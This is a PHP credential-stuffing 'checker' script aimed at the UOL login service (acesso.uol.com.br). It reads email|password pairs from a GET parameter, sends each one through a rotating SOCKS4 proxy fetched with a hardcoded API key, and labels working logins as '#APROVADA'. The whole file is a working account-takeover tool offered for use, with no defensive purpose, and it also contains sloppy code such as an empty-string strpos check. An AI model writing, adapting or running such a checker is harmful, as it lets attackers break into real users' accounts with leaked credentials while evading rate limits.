
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

extract($_GET);

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i < $c; $i++) { 
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/americanas.txt")) {
		unlink(getcwd()."/americanas.txt");
	}

$link = file_get_contents("https://api.getproxylist.com/proxy?apiKey=2769d07972701a1cb65b10f9565e205f3fcd463a&protocol=socks4&lastTested=600");
$link2 = json_decode($link);
$link3 = $link2 ->ip;
$link4 = $link2 ->port;
$proxy = $link3.":".$link4;

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://acesso.uol.com.br/login.html");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_PROXY, $proxy);
	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
	curl_setopt($ch, CURLOPT_REFERER, "https://acesso.uol.com.br/login.html?skin=sac&dest=REDIR|https://sac.uol.com.br/%23/");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/pagseguro.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/pagseguro.txt');
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'Host: acesso.uol.com.br',
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Content-Type: application/x-www-form-urlencoded',
		'Connection: keep-alive'));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'user='.$email.'&pass='.$senha.'&skin=sac&dest=REDIR%7Chttps%3A%2F%2Fsac.uol.com.br%2F%23%2F&url=&sc=&deviceId='.$token.'');
	$resposta = curl_exec($ch);



	if (strpos($resposta, 'Sair')) {

			echo "<font class='label label-success'>#APROVADA</font> ".$email." | ".$senha." Proxy Utilizada: ".$proxy."<font class='label label-warning'>#BlackStar</font><br>";
		//	echo $resposta;

	} elseif (strpos($resposta, '')) {
			echo "<font class='label label-danger'>#REPROVADA</font> ".$email." | ".$senha." proxy Utilizada: ".$proxy."<br>";
		//echo $resposta;
}

	else{
			echo "<font class='label label-danger'>#REPROVADA</font> ".$email." | ".$senha." proxy Utilizada: ".$proxy."<br>";
		//	echo $resposta;

	}

}



?>